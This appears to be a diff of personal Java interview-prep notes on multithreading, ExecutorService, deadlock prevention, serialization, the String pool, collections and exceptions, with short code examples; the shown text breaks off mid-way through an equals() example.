+Thread is running...
+✅ Use Case: When we need to implement multiple interfaces (since Java does not support multiple inheritance).
+
+# 3️⃣ Using Java 8 Lambda Expressions
+
+Since Runnable is a functional interface, we can use a lambda expression.
+🔹 Example:
+```
+public class LambdaThreadExample {
+    public static void main(String[] args) {
+        Thread t1 = new Thread(() -> System.out.println("Thread is running using Lambda..."));
+        t1.start();
+    }
+}
+```
+🔹 Output:
+
+arduino
+
+Thread is running using Lambda...
+✅ Use Case: When we want cleaner and more concise code.
+
+# 4️⃣ Using ExecutorService (Thread Pool - Recommended for Large Scale Apps)
+Instead of manually managing threads, Java provides the ExecutorService framework.
+It allows efficient thread pooling and resource management.
+🔹 Example:
+```
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+public class ExecutorExample {
+    public static void main(String[] args) {
+        ExecutorService executor = Executors.newFixedThreadPool(2);
+
+        executor.submit(() -> System.out.println("Thread executed using ExecutorService"));
+        executor.shutdown(); // Always shut down the executor after use
+    }
+}
+```
+🔹 Output:
+
+Thread executed using ExecutorService
+✅ Use Case: When we need better thread management and scalability.
+
+## ExecutorService 
+
+ExecutorService is used to manage and execute multiple threads concurrently without manually creating threads.
+It is part of the java.util.concurrent package.
+In Java, ExecutorService is used to manage and execute multiple threads concurrently without manually creating threads.
+It is part of the java.util.concurrent package.
+
+Instead of doing:
+
+new Thread().start();
+
+We use ExecutorService, which provides a thread pool to efficiently manage threads.
+
+1️⃣ Basic Idea
+
+ExecutorService works like a thread manager.
+
+Tasks submitted
+      ↓
+ExecutorService
+      ↓
+Thread Pool
+      ↓
+Tasks executed concurrently
+
+Benefits:
+
+Reuses threads (better performance)
+
+Avoids creating too many threads
+
+Better thread lifecycle management
+
+2️⃣ Creating an ExecutorService
+
+Most common way:
+
+ExecutorService executor = Executors.newFixedThreadPool(3);
+
+This creates a thread pool with 3 threads.
+
+Meaning 3 tasks can run at the same time.
+
+3️⃣ Example: Running Tasks Concurrently
+
+```
+public class ExecutorExample {
+
+    public static void main(String[] args) {
+
+        ExecutorService executor = Executors.newFixedThreadPool(3);
+
+        for(int i = 1; i <= 5; i++) {
+
+            int task = i;
+
+            executor.submit(() -> {
+                System.out.println(
+                    "Task " + task +
+                    " executed by " +
+                    Thread.currentThread().getName()
+                );
+            });
+        }
+
+        executor.shutdown();
+    }
+}
+```
+Example Output
+Task 1 executed by pool-1-thread-1
+Task 2 executed by pool-1-thread-2
+Task 3 executed by pool-1-thread-3
+Task 4 executed by pool-1-thread-1
+Task 5 executed by pool-1-thread-2
+
+Threads are reused.
+
+4️⃣ submit() vs execute() 
+
+Use execute() when
+
+a) You don't need a result
+
+b) You just want to run a background task
+
+Example:
+
+Logging
+
+Fire-and-forget tasks
+
+Use submit() when
+
+a) You need a return value
+
+b) You want to track task completion
+
+c) You need exception handling through Future
+
+Example:
+
+Database queries
+
+API calls returning responses
+
+
+5️⃣ Types of ExecutorService Thread Pools
+Fixed Thread Pool
+Executors.newFixedThreadPool(5)
+
+Fixed number of threads.
+
+Cached Thread Pool
+Executors.newCachedThreadPool()
+
+Creates threads as needed.
+
+Single Thread Executor
+Executors.newSingleThreadExecutor()
+
+Only one thread executes tasks sequentially.
+
+Scheduled Thread Pool
+Executors.newScheduledThreadPool(2)
+
+Used for scheduled tasks.
+
+Example:
+
+scheduleAtFixedRate()
+6️⃣ Proper Shutdown
+
+Always shutdown ExecutorService.
+
+executor.shutdown();
+
+or
+
+executor.shutdownNow();
+
+Difference:
+
+Method	Behavior
+shutdown()	finishes existing tasks
+shutdownNow()	stops immediately
+7️⃣ Real World Example
+
+Suppose you are calling multiple APIs concurrently.
+
+ExecutorService executor = Executors.newFixedThreadPool(3);
+
+executor.submit(() -> callUserService());
+executor.submit(() -> callOrderService());
+executor.submit(() -> callPaymentService());
+
+All three APIs execute in parallel.
+
+8️⃣ Why ExecutorService Is Better Than Thread
+Thread	ExecutorService
+Manual thread creation	Thread pool management
+Hard to scale	Easy scalability
+No lifecycle control	Controlled shutdown
+No result handling	Supports Future
+
+
+
+## 🚀 Which One Should You Use?
+
+✅ Use Runnable or Lambda when you don’t need to extend Thread.
+✅ Use ExecutorService for multi-threading in real-world applications.
+❌ Avoid directly extending Thread, unless necessary.
+
+
+
+
+
+###  When to Implement Runnable vs. Extend Thread in Java?
+
+In Java, you can create a thread by implementing Runnable or extending Thread, but the best choice depends on the use case.
+
+# 🔹 Implement Runnable When:
+
+✅ You need to follow best practices – Implementing Runnable is the preferred approach.
+✅ You need multiple inheritance – Since Java doesn’t support multiple inheritance, you can extend another class while implementing Runnable.
+✅ You want to separate logic from threading behavior – The Runnable object can be passed to different Thread instances.
+✅ You want better thread management – Works well with thread pools (ExecutorService).
+
+🔹 Example:
+
+class MyTask implements Runnable {
+    @Override
+    public void run() {
+        System.out.println("Runnable thread is running...");
+    }
+}
+
+public class RunnableExample {
+    public static void main(String[] args) {
+        Thread t1 = new Thread(new MyTask()); // Pass Runnable to Thread
+        t1.start();
+    }
+}
+📝 Use Case:
+
+When your class already extends another class, since Java doesn’t support multiple inheritance.
+
+When working with ExecutorService for better thread management.
+
+# 🔹 Extend Thread When:
+
+✅ You need to override Thread class methods – If you need to modify methods like start(), run(), or interrupt().
+✅ Your thread has unique behavior – If the thread logic is tightly coupled with the thread itself.
+✅ You don’t need multiple inheritance – Since extending Thread means you can't extend another class.
+
+🔹 Example:
+```
+
+class MyThread extends Thread {
+    @Override
+    public void run() {
+        System.out.println("Thread class is running...");
+    }
+}
+
+public class ThreadExample {
+    public static void main(String[] args) {
+        MyThread t1 = new MyThread();
+        t1.start();
+    }
+}
+```
+📝 Use Case:
+
+When you need full control over the thread behavior.
+When extending Thread makes the code more readable (not recommended for large applications).
+# 🔥 Key Differences:=
+Feature	Implementing Runnable	Extending Thread
+Inheritance	Allows extending another class	Cannot extend another class
+Code Reusability	Better, as Runnable can be reused	Less reusable, as logic is in Thread
+Flexibility	Can be used with ExecutorService	Cannot be used with ExecutorService
+Coupling	Loosely coupled with Thread	Tightly coupled with Thread
+# 🚀 Final Recommendation:
+
+Use Runnable in most cases – It promotes code reusability and allows multiple inheritance.
+
+Extend Thread only when you need to modify thread behavior (e.g., overriding start() or interrupt()).
+
+For large-scale applications, always use Runnable with ExecutorService.
+
+# ✅ When to Use ConcurrentHashMap vs. HashMap in Java?
+
+Both ConcurrentHashMap and HashMap store key-value pairs, but their use cases differ based on thread safety and performance requirements.
+
+🔹 Use HashMap When:
+
+✅ Single-threaded environments – If your application doesn’t have multiple threads modifying the map concurrently.
+
+✅ Performance is a priority – HashMap is faster than ConcurrentHashMap because it has no synchronization overhead.
+
+✅ You don’t need thread safety – If your map is accessed by only one thread at a time.
+
+🔹 Example:
+```
+import java.util.HashMap;
+
+public class HashMapExample {
+    public static void main(String[] args) {
+        HashMap<Integer, String> map = new HashMap<>();
+        map.put(1, "Apple");
+        map.put(2, "Banana");
+        System.out.println(map.get(1)); // Output: Apple
+    }
+}
+```
+
+🚫 Avoid using HashMap in multi-threaded environments – If multiple threads modify it, it may cause data inconsistency or even a race condition.
+
+🔹 Use ConcurrentHashMap When:
+
+✅ Multi-threaded environments – If multiple threads read and write to the map simultaneously.
+
+✅ Thread safety is required – Unlike HashMap, ConcurrentHashMap doesn’t allow structural modifications (e.g., resizing) to cause issues in concurrent environments.
+
+✅ Better performance than Collections.synchronizedMap() – It uses finer-grained locking, allowing better performance in concurrent scenarios.
+
+🔹 Example:
+```
+import java.util.concurrent.ConcurrentHashMap;
+
+public class ConcurrentHashMapExample {
+    public static void main(String[] args) {
+        ConcurrentHashMap<Integer, String> map = new ConcurrentHashMap<>();
+        map.put(1, "Apple");
+        map.put(2, "Banana");
+
+        System.out.println(map.get(1)); // Output: Apple
+    }
+}
+```
+
+#### ✅ What is `Callable` in Java?  
+
+`Callable<T>` is an interface in Java used to represent **tasks that return a result and can throw checked exceptions**. It is similar to `Runnable`, but with **more capabilities**.  
+
+---
+
+## 🔹 Key Differences Between `Callable` and `Runnable`  
+
+| **Feature**               | **Runnable**                          | **Callable<T>**                        |
+|---------------------------|--------------------------------------|----------------------------------------|
+| **Return Type**           | `void` (does not return a value)     | Returns a value (`T`)                 |
+| **Exception Handling**    | Cannot throw checked exceptions      | Can throw checked exceptions          |
+| **Used With**             | `Thread` or `ExecutorService`        | `ExecutorService` with `Future<T>`    |
+| **Blocking Behavior**     | Does not support blocking            | Supports blocking with `Future.get()` |
+
+---
+
+
+## 🔹 Why Use Callable?
+✅ When you need to return a result from a thread.
+✅ When you need to handle checked exceptions in concurrent tasks.
+✅ When working with thread pools (ExecutorService).
+
+###  ✅ Deadlock in Java Multi-Threading
+
+A deadlock occurs in Java when two or more threads are waiting for each other to release locks, but none of them can proceed, causing a permanent block in execution.
+
+### 🔹 How Does Deadlock Happen?
+A deadlock situation can occur when:
+
+Thread-1 holds Lock-A and waits for Lock-B.
+Thread-2 holds Lock-B and waits for Lock-A.
+Neither thread can proceed because both are waiting for each other to release the locks.
+
+### 🛠 How to Prevent Deadlock?
+
+✅ 1. Use Lock Ordering
+Always acquire locks in the same order to avoid circular waiting.
+```
+class SafeResource {
+    void methodA(SafeResource resource) {
+        synchronized (this) { // Always acquire locks in order
+            System.out.println(Thread.currentThread().getName() + " locked " + this);
+            synchronized (resource) {
+                System.out.println(Thread.currentThread().getName() + " locked " + resource);
+            }
+        }
+    }
+}
+```
+✅ 2. Use tryLock() Instead of synchronized (Avoid Waiting Forever)
+Using ReentrantLock.tryLock() prevents deadlock by timing out if a lock isn’t available.
+```
+import java.util.concurrent.locks.Lock;
+import java.util.concurrent.locks.ReentrantLock;
+
+class SafeResource {
+    private final Lock lock = new ReentrantLock();
+
+    void methodA(SafeResource resource) {
+        try {
+            if (lock.tryLock()) {
+                try {
+                    System.out.println(Thread.currentThread().getName() + " locked " + this);
+                    if (resource.lock.tryLock()) {
+                        try {
+                            System.out.println(Thread.currentThread().getName() + " locked " + resource);
+                        } finally {
+                            resource.lock.unlock();
+                        }
+                    }
+                } finally {
+                    lock.unlock();
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+✅ 3. Avoid Nested Locks
+
+Minimize synchronized blocks and use locks only when needed.
+```
+synchronized (lock1) {
+    // Critical section
+}
+synchronized (lock2) {  // Avoid acquiring nested locks
+    // Critical section
+}
+```
+✅ 4. Use a Deadlock Detection Tool
+Use Java Thread Dump (jstack) or profiling tools like VisualVM to detect deadlocks.
+
+jstack <pid>
+
+🚀 Final Recommendation
+Approach	Effectiveness
+Lock Ordering	✅ Highly effective
+Using tryLock()	✅ Prevents deadlocks
+Avoid Nested Locks	✅ Reduces risk
+Thread Dump Analysis	✅ Helps detection
+
+
+##  What is the difference between the start() and run() method?
+
+First, both methods are operated in general over the thread. So if we do use threadT1.start() then this method will look for the run() method to create a new thread. 
+While in case of theadT1.run() method will be executed just likely the normal method by the “Main” thread without the creation of any new thread.
+
+### Serialization 
+Serialization in Java is the process of converting an object into a byte stream so that it can be persisted to a file, sent over a network, or stored in a database. Deserialization is the reverse process, where the byte stream is converted back into an object.
+
+Imagine you have a Toy (Java Object), and you want to pack it into a box (Convert to a file or stream) so you can store it or send it to someone. Later, you can unpack (Deserialize) it to get back the same toy (Java Object).
+
+### transient Keyword:
+
+Fields marked as transient are not serialized.
+### serialVersionUID:
+
+A unique identifier to maintain version compatibility during deserialization.
+
+## Where is Serialization Used in a Spring Boot Project?
+
+Serialization is widely used in Spring Boot for various functionalities, such as caching, session management, database operations, and messaging. 
+
+## 🔹 Summary: Where Serialization is Used in Spring Boot
+Caching (Redis, Ehcache)	Objects are stored in cache
+Session Management	Sessions need to be shared across instances
+Message Queues (Kafka, RabbitMQ)	Objects need to be sent as messages
+REST APIs (Jackson, JSON/XML)	Objects are converted to JSON/XML
+Database ORM (JPA/Hibernate)	Objects with non-standard fields need serialization
+File Storage (S3, Local, NFS)	Objects are stored as files
+
+### What is Deserialization?
+
+Deserialization is the reverse of serialization—it converts stored or transmitted data (bytes, JSON, XML, etc.) back into a Java object.
+
+
+## 📌 Where is Deserialization Used in Spring Boot?
+Use Case	How Deserialization Happens?
+REST APIs (JSON/XML to Object)	Jackson converts JSON/XML into Java objects
+Message Queues (Kafka, RabbitMQ)	Messages are deserialized into Java objects
+Caching (Redis, Ehcache)	Cached objects are deserialized before use
+Session Management	Session attributes are deserialized when restored
+Database ORM (JPA/Hibernate)	Objects are deserialized when retrieved from DB
+File Storage (S3, Local, NFS)	Stored objects are deserialized when loaded
+
+
+### String Pool in Java
+
+The String Pool in Java is a special memory area inside the heap called the String Constant Pool (SCP) or String Intern Pool. It optimizes memory usage by storing only one copy of each unique string literal, reducing redundancy and improving performance.
+
+# 1. How String Pool Works?
+
+When a string literal (e.g., "Hello") is created, Java first checks the String Pool.
+If the literal already exists in the pool, Java returns a reference to the existing object.
+If it does not exist, Java creates a new string in the pool.
+
+# 2. Example of String Pool Behavior
+
+public class StringPoolExample {
+    public static void main(String[] args) {
+        String s1 = "Hello";
+        String s2 = "Hello";
+
+        System.out.println(s1 == s2);  // true (Same reference from the String Pool)
+    }
+}
+Both s1 and s2 point to the same object in the String Pool.
+
+# 3. String Pool and new Keyword
+When you create a String using new, it creates a new object in the heap, not in the pool.
+
+
+public class StringHeapExample {
+    public static void main(String[] args) {
+        String s1 = "Hello";  
+        String s2 = new String("Hello");
+
+        System.out.println(s1 == s2);  // false (Different memory locations)
+    }
+}
+"Hello" is stored in the String Pool.
+new String("Hello") creates a new object in the heap.
+
+# 4. Using intern() to Add Strings to the Pool
+If you create a string using new, but want to store it in the pool, use .intern():
+
+public class StringInternExample {
+    public static void main(String[] args) {
+        String s1 = new String("Java");
+        String s2 = s1.intern(); // Moves "Java" to the String Pool
+
+        String s3 = "Java";
+
+        System.out.println(s2 == s3);  // true (Both refer to the same pool object)
+    }
+}
+
+# 5. Benefits of the String Pool
+✅ Memory Efficiency – Avoids storing duplicate string objects.
+✅ Performance Optimization – Reusing immutable strings reduces object creation overhead.
+✅ Thread-Safety – Strings are immutable and safely shared across threads.
+
+# 6. When Should You Avoid String Pool?
+If you have many dynamic strings (e.g., reading from files or databases), storing them in the pool can cause memory overhead.
+Use new String(value) to avoid pooling if necessary.
+
+### How do you handle deadlocks in Java?
+
+A deadlock occurs in a multithreaded program when two or more threads are waiting for each other's resources, preventing further execution.
+
+
+## Handling Deadlocks in Java
+
+
+1️⃣ Avoid Nested Locks
+
+2️⃣ Use Try-Lock Instead of Synchronized
+
+3️⃣ Implement a Lock Ordering Mechanism
+Always acquire locks in a consistent order to avoid circular waiting.
+
+4️⃣ Set Timeouts for Locks
+Using tryLock(timeout, TimeUnit) in ReentrantLock to avoid indefinite waiting.
+
+5️⃣ Detect and Recover from Deadlocks
+
+
+##  What is a ThreadPool in Java?
+A ThreadPool is a pool of pre-created threads that can be reused to execute multiple tasks instead of creating new threads for each task. It helps manage a large number of threads efficiently.
+
+Java provides the Executor Framework (java.util.concurrent.Executors) to manage thread pools.
+
+
+### 🔹 What is ExecutorService ?
+
+ExecutorService is a special thread manager in Java that helps you run multiple tasks in the background using a pool of threads. Instead of manually creating and managing threads, ExecutorService does it for you efficiently.
+
+Think of it as a task manager:
+
+You submit tasks, and it assigns them to available threads.
+It reuses threads instead of creating new ones for every task.
+It ensures better performance by managing threads automatically.
+
+## 🔹 Why Use ExecutorService?
+
+✅ Easy to use – No need to manually create and start threads.
+✅ Improves performance – Reuses threads instead of constantly creating/destroying them.
+✅ Prevents resource exhaustion – Limits the number of running threads.
+✅ Supports scheduling – Can run tasks periodically.
+
+
+## 🔹 How to Use ExecutorService?
+
+1️⃣ Create a Thread Pool
+```
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+public class ExecutorServiceExample {
+    public static void main(String[] args) {
+        ExecutorService executor = Executors.newFixedThreadPool(3); // 3 threads in the pool
+
+        for (int i = 1; i <= 5; i++) {
+            final int taskNumber = i;
+            executor.execute(() -> {
+                System.out.println("Task " + taskNumber + " executed by " + Thread.currentThread().getName());
+            });
+        }
+
+        executor.shutdown(); // Gracefully shuts down after all tasks are done
+    }
+}
+```
+## 🔹 What happens here?
+
+We create a thread pool with 3 threads.
+
+We submit 5 tasks → They run in the available threads.
+
+The executor.shutdown() ensures tasks complete before shutting down.
+
+
+### 🔹 Different Types of ExecutorService
+1️⃣ Fixed Thread Pool – Limits the number of threads.
+
+ExecutorService executor = Executors.newFixedThreadPool(3);
+
+2️⃣ Cached Thread Pool – Creates new threads as needed but reuses idle threads.
+
+ExecutorService executor = Executors.newCachedThreadPool();
+
+3️⃣ Single Thread Executor – Runs tasks one at a time in a single thread.
+
+ExecutorService executor = Executors.newSingleThreadExecutor();
+
+4️⃣ Scheduled Thread Pool – Runs tasks after a delay or at fixed intervals.
+
+
+ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2);
+
+
+## Volatile Keyword
+
+
+The volatile keyword in Java is used for thread safety when accessing shared variables in a multithreaded environment. It ensures that:
+
+Visibility: Changes made by one thread are immediately visible to other threads.
+Prevents Caching: The variable is always read from and written to main memory, not from CPU caches.
+Atomicity for Reads/Writes: Ensures that reads and writes are atomic for variables (but not compound operations like count++).
+
+###  Marker Interface in Java
+A Marker Interface is an interface that does not contain any methods or fields. It is used to signal or "mark" a class, providing metadata that can be used by the Java runtime or frameworks to apply special behavior.
+
+# Examples of Marker Interfaces in Java
+Some built-in marker interfaces in Java include:
+
+Serializable (Java I/O) – Marks objects that can be serialized.
+Cloneable (Java Object Cloning) – Marks objects that can be cloned using clone().
+Remote (Java RMI) – Marks objects that can be used for remote method invocation (RMI).
+
+### ✅ Why Use @FunctionalInterface?
+Ensures the interface has only ONE abstract method
+If a developer accidentally adds a second method, the compiler will throw an error.
+Improves code readability and clarity
+Clearly tells other developers that the interface is intended for functional programming.
+Enables lambda expressions
+Functional interfaces are essential for Java’s functional programming features, especially in Java 8 and later.
+
+### Serializable
+
+The Serializable interface in Java is a marker interface (i.e., it has no methods) that allows an object to be converted into a byte stream so that it can be saved to a file, sent over a network, or stored in a database.
+
+When an object is serialized, its state (i.e., its fields) is converted into a format that can be deserialized (restored) later.
+
+## Why Use Serializable?
+To save an object's state to a file or database.
+To send objects over a network (e.g., in RMI, HTTP requests, or WebSockets).
+To cache objects for faster access in future requests.
+To share objects between different JVMs.
+
+## How to Make a Class Serializable?
+Simply implement java.io.Serializable, since it's a marker interface (no methods to implement).
+
+## serialVersionUID – Why Is It Important?
+serialVersionUID is a unique identifier that ensures version compatibility during deserialization.
+If you modify a class after serialization (e.g., add/remove fields), deserialization will fail unless serialVersionUID remains the same.
+
+
+###  transient Keyword in Java
+The transient keyword in Java is used to prevent a field from being serialized when an object is converted into a byte stream.
+
+When a field is declared transient, it is ignored during serialization, meaning it won't be saved and will have its default value when deserialized.
+
+## Why Use transient?
+Protect sensitive data – e.g., passwords, security keys.
+Avoid unnecessary serialization – e.g., cache data, large objects.
+Prevent serialization errors – e.g., when a field is not Serializable.
+
+### Java memory is divided into the following key regions:
+
+Heap Memory	Stores objects and instance variables (shared across threads).
+
+Stack Memory	Stores method-local variables, method calls, and references (per thread).
+
+Method Area (MetaSpace in Java 8+)	Stores class metadata, static variables, and constants.
+
+PC Register	Holds the address of the currently executing instruction.
+
+Native Method Stack	Used for native (JNI) method execution.
+
+### Can We Override a Static Method in Java?
+No, we cannot override a static method in Java. However, we can hide a static method in the child class.
+
+###   Why Can't We Override Static Methods?
+Method Overriding is Based on Dynamic Binding (Runtime Polymorphism)
+
+1) Static methods belong to the class, not the instance.
+Overriding works with instances, but static methods do not depend on objects.
+Static Methods are Resolved at Compile-Time
+
+2) Method overriding depends on dynamic method dispatch (runtime binding).
+Static methods are resolved at compile-time, so method calls are bound to the class, not the object.
+
+
+###  How to Create a Thread in Java?
+In Java, we can create a thread using two main approaches:
+
+a) Extending the Thread class
+b) Implementing the Runnable interface
+c)  Creating a Thread Using a Lambda Expression (Java 8+)
+Since Runnable is a functional interface, we can use a lambda expression to create a thread in a shorter way.
+
+✅ Example
+```
+public class LambdaThreadExample {
+    public static void main(String[] args) {
+        Thread t1 = new Thread(() -> {
+            System.out.println("Thread using lambda is running... " + Thread.currentThread().getName());
+        });
+
+        t1.start();
+    }
+}
+```
+d)Creating a Thread Using an Executor Service (ThreadPool)
+
+Instead of manually creating threads, we can use a thread pool for efficient thread management.
+
+✅ Example: Using ExecutorService
+```
+public class ThreadPoolExample {
+    public static void main(String[] args) {
+        ExecutorService executor = Executors.newFixedThreadPool(3);
+
+        for (int i = 0; i < 5; i++) {
+            executor.execute(() -> {
+                System.out.println("Thread from pool: " + Thread.currentThread().getName());
+            });
+        }
+
+        executor.shutdown();
+    }
+}
+```
+
+## Which Approach Should You Use?
+
+| Method                   | Use Case                                                                                                                       |
+|--------------------------|--------------------------------------------------------------------------------------------------------------------------------|
+| Extending Thread         | When you need to create a thread by inheriting the Thread class (but not recommended due to lack of flexibility).               |
+| Implementing Runnable    | Preferred method, as Java supports only single inheritance, and we can implement multiple interfaces.                          |
+| Lambda Expression        | Best for short and simple thread tasks (Java 8+).                                                                               |
+| Executor Service (ThreadPool) | Best when managing multiple threads efficiently, especially in production.                                                  |
+
+
+
+## Kafka Architecture
+
+| Component       | Description                                                                           |
+|-----------------|---------------------------------------------------------------------------------------|
+| Producer        | Sends messages (events) to Kafka topics.                                              |
+| Broker          | Kafka server that stores and manages messages.                                        |
+| Topic           | Logical name where messages are stored (similar to a table in databases).             |
+| Partition       | A topic is divided into partitions for scalability.                                   |
+| Consumer        | Reads messages from topics.                                                           |
+| Consumer Group  | A group of consumers that parallelly consume messages from a topic.                   |
+| Zookeeper       | Manages Kafka metadata, leader election, and configuration.                           |
+
+### 1️⃣ @Mock
+Purpose: Creates a mock instance of a class or interface.
+Usage: Used to mock dependencies of the class being tested.
+Behavior: Does not call real methods but returns stubbed/mock responses.
+Example
+```
+@Mock
+private UserRepository userRepository;
+```
+
+🔹 This tells Mockito to create a fake instance of UserRepository (without hitting the real database).
+
+### 2️⃣ @InjectMocks
+
+Purpose: Injects mocked dependencies into a real instance of a class.
+Usage: Used for the class under test.
+Behavior: Calls real methods of the main class, but mocked dependencies return stubbed values.
+Example
+```
+@InjectMocks
+private UserService userService;
+```
+🔹 This tells Mockito to inject the mocked UserRepository into UserService
+
+## Default Behavior of equals() in String Class
+Unlike objects that inherit equals() from Object, 
+the String class overrides equals() to compare character sequences instead of memory references.
+
+## Does equals() Check Value for Strings in Java? 🤔
+✅ Yes!
+For Strings, equals() checks the actual value (content), not the memory reference.
+
+## Does equals() Check Memory Reference in Java? 🤔
+It depends on whether equals() is overridden or not.✅
+Since equals() is not overridden, it behaves like == and checks memory references.
+Default equals() in Object
+```
+public boolean equals(Object obj) {
+    return (this == obj);  // Memory reference check
+}
+```
+
+### Deadlock Prevention
+
+Deadlocks occur when multiple threads acquire locks in different orders.
+The solution is to always acquire locks in a fixed order to prevent circular waiting.
+synchronized(LOCK1) first, then synchronized(LOCK2) ensures safe locking.
+
+
+### default Keyword in Java 8
+
+In Java 8, the default keyword is used to define default methods in interfaces. This allows interfaces to have method implementations without breaking existing implementing classes.
+
+## Why Default Methods?
+
+Before Java 8, interfaces could only have abstract methods. If a new method was added to an interface, all implementing classes had to implement it. Default methods solve this problem by allowing new methods with a default implementation.
+
+1)Backward Compatibility
+
+Allows adding new methods to interfaces without breaking existing implementations.
+
+2)  Multiple Inheritance Issue
+   
+If a class implements two interfaces with the same default method, Java forces an override to resolve ambiguity.
+
+### GENERICS
+
+Generics in Java are like templates that let you write code that works with different types of data without having to rewrite the same code for each type. They make your code more flexible, reusable, and type-safe.
+
+### What is meant by asynchronous programming?
+
+Asynchronous programming is a programming paradigm that allows a program to initiate tasks that run separately from the main application thread, enabling the program to continue executing other operations without waiting for these tasks to complete. This approach enhances efficiency, especially in applications that perform time-consuming operations like file I/O, network requests, or database queries.
+
+
+### CompletableFuture 
+
+It is a class introduced in Java 8 that facilitates asynchronous programming. It allows you to run tasks in the background without blocking the main thread, enabling your application to perform other operations simultaneously.
+
+# Key Features:
+
+Asynchronous Execution: Run tasks independently without waiting for them to complete.
+
+Task Chaining: Link multiple tasks to run in sequence or in parallel, where each task can start after the previous one finishes.
+
+Manual Completion: Explicitly complete a task and provide its result when it's ready.
+
+Exception Handling: Gracefully manage errors that occur during asynchronous operations.
+
+Simple Example:-
+
+Here's how you can use CompletableFuture to run a task asynchronously:
+
+```
+import java.util.concurrent.CompletableFuture;
+
+public class CompletableFutureExample {
+    public static void main(String[] args) {
+        // Run a task asynchronously
+        CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
+            // Simulate a long-running task
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            System.out.println("Task completed!");
+        });
+
+        // Continue with other tasks...
+
+        // Wait for the asynchronous task to complete
+        future.join();
+    }
+}
+```
+In this example, the task runs in the background, allowing the main thread to proceed with other operations. The join() method ensures that the main thread waits for the asynchronous task to finish before exiting.
+
+By using CompletableFuture, you can write more efficient and responsive applications that handle multiple tasks concurrently without unnecessary delays.
+
+### Fork in Java
+
+In Java, the concept of "forking" is implemented through the Fork/Join framework, introduced in Java 7 as part of the java.util.concurrent package. This framework facilitates parallel execution by recursively dividing tasks into smaller subtasks (forking) and then combining their results (joining), aligning with the fork–join model of parallel computing. 
+
+
+### Key Components of the Fork/Join Framework:
+
+### ForkJoinPool:
+
+A specialized implementation of ExecutorService designed to manage and execute tasks that can be broken down into subtasks. It utilizes a work-stealing algorithm to efficiently distribute tasks among available threads. 
+
+
+### ForkJoinTask: 
+
+An abstract class representing a task that can be subdivided into smaller tasks. Subclasses include RecursiveTask (which returns a result) and RecursiveAction (which does not return a result).
+
+### THRED SAFE DATA STRUCTURES
+
+#### 1. Concurrent Collections (from java.util.concurrent)
+
+ConcurrentHashMap — thread-safe version of HashMap.
+
+ConcurrentSkipListMap — thread-safe version of TreeMap (sorted map).
+
+ConcurrentSkipListSet — thread-safe version of TreeSet.
+
+CopyOnWriteArrayList — thread-safe version of ArrayList (optimized for more reads, fewer writes).
+
+CopyOnWriteArraySet — thread-safe Set based on CopyOnWriteArrayList.
+
+LinkedBlockingQueue — thread-safe queue for producer-consumer patterns (FIFO).
+
+ArrayBlockingQueue — bounded, thread-safe queue.
+
+PriorityBlockingQueue — unbounded, thread-safe priority queue.
+
+DelayQueue — queue where elements become available after a delay.
+
+SynchronousQueue — queue where insert and remove operations must happen simultaneously.
+
+LinkedTransferQueue — highly scalable, non-blocking queue.
+
+ConcurrentLinkedQueue — non-blocking, thread-safe queue (FIFO).
+
+ConcurrentLinkedDeque — non-blocking, thread-safe double-ended queue.
+
+#### 2. Synchronized Wrappers (from Collections.synchronizedXxx)
+
+(These provide coarse-grained synchronization — full method locking.)
+
+Collections.synchronizedList(List list) — wraps any list (e.g., ArrayList, LinkedList).
+
+Collections.synchronizedMap(Map map) — wraps any map (e.g., HashMap).
+
+Collections.synchronizedSet(Set set) — wraps any set.
+
+Collections.synchronizedSortedMap(SortedMap map) — wraps TreeMap.
+
+Collections.synchronizedSortedSet(SortedSet set) — wraps TreeSet.
+
+#### 3. Legacy Thread-Safe Classes (built-in synchronization)
+
+Vector — thread-safe dynamic array (older, slower, replaced by CopyOnWriteArrayList usually).
+
+Hashtable — thread-safe hash map (older, slower, replaced by ConcurrentHashMap).
+
+Stack — thread-safe (extends Vector).
+
+#### 4. Atomic Variables and Structures (from java.util.concurrent.atomic)
+
+AtomicInteger, AtomicLong, AtomicBoolean, AtomicReference — thread-safe primitive wrappers.
+
+AtomicIntegerArray, AtomicLongArray — thread-safe arrays.
+
+AtomicReferenceArray — thread-safe reference arrays.
+
+#### 5. Special Thread-Safe Data Structures
+
+Phaser, CyclicBarrier, CountDownLatch — for synchronization (though not exactly "data structures," still important).
+
+StampedLock — used for more efficient read/write locks compared to ReentrantReadWriteLock (not a data structure, but can make structures thread-safe with careful design).
+
+
+
+
+### ✅ Checked Exceptions (must be handled or declared)
+
+These extend `Exception` but not `RuntimeException`.
+
+| Exception Type              | Description                                      |
+|----------------------------|--------------------------------------------------|
+| `IOException`              | Error during input/output operations             |
+| `FileNotFoundException`    | File not found during file read operation        |
+| `SQLException`             | Issues with database access                      |
+| `ParseException`           | Error while parsing data (e.g., dates)           |
+| `ClassNotFoundException`   | When a class is not found at runtime             |
+| `InterruptedException`     | When a thread is interrupted                     |
+| `CloneNotSupportedException` | Thrown when `clone()` is not supported         |
+
+✅ Checked exceptions occur at:
+⏱️ Compile Time
+
+📌 Explanation:
+Checked exceptions are checked by the Java compiler.
+
+If your code throws a checked exception, the compiler forces you to either:
+
+Handle it using try-catch, or
+
+Declare it using throws in the method signature.
+
+If you do neither, your code will not compile.
+
+
+
+### What does synchronized do?
+
+It ensures that only ONE thread at a time can execute a particular block of code or method on the same object (lock).
+
+
+
+---
+
+### ❌ Unchecked Exceptions (no need to handle, runtime error)
+
+These extend `RuntimeException`.
+
+| Exception Type                   | Description                                     |
+|----------------------------------|-------------------------------------------------|
+| `NullPointerException`           | Accessing members on a null object              |
+| `ArrayIndexOutOfBoundsException` | Accessing invalid index in array                |
+| `ArithmeticException`            | Division by zero                                |
+| `IllegalArgumentException`       | Invalid argument passed to a method             |
+| `NumberFormatException`          | Parsing a string that is not a valid number     |
+| `IllegalStateException`          | Method called at wrong time/state               |
+| `ClassCastException`             | Invalid casting between types                   |
+
+
+### How to check if two objects are equal?
+
+```
+class Student {
+    int id;
+    String name;
+
+    Student(int id, String name) {
+        this.id = id;
+        this.name = name;
+    }
+
+    @Override
+    public boolean equals(Object o) {
+
+        if (this == o) return true;     // same object
